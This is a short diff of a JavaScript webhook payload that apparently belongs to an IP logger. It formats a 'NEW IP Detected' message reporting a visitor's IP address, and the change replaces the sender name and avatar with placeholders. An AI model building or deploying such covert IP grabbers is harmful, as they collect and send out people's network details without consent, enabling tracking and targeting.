@@ -27,9 +27,9 @@ const request = async () => { // Calling a "synchronous" fetch
 
     postRequest.setRequestHeader('Content-type', 'application/json');
 
-    var params = {
-        username: "Sex",
-        avatar_url: "",
+    var params = {   //this is the start of your webhook
+        username: "USERNAME",
+        avatar_url: "IMAGE",
         content:   
                     "__**NEW IP Detected**__"
                     "```__**:globe_with_meridians: IP-Adress:**__ \n" 
